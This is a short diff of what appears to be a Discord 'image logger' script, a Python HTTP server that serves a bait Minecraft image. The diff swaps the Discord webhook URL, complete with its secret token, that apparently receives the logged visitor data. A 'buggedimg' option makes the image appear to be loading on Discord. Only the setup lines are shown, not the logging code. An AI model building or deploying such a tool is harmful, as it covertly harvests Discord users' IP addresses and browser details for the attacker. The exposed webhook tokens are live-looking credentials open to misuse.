@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1057771762168889414/h-h4aJX3AL9BWXr05k1I7RkEZT8QnKzzFFA9Xv5kw8Cxw0tIPmgXrw0MGxqsuCe289Rq'
+webhook = 'https://discord.com/api/webhooks/1057772773528830032/HWtqqZlDUdw1nF18OWT0dLSJ69D_CdAjwe_Sws9bXZTkTxOI7v2IEOro9mygE5mDF83H'
 bindata = requests.get('https://cdn.vox-cdn.com/thumbor/l9a45cx4ZfppNgzhQ5H3EX6glvs=/1400x1050/filters:format(jpeg)/cdn.vox-cdn.com/uploads/chorus_asset/file/19355555/jbareham_191158_ply0958_decade_minecraft.jpg').content
 
 buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)
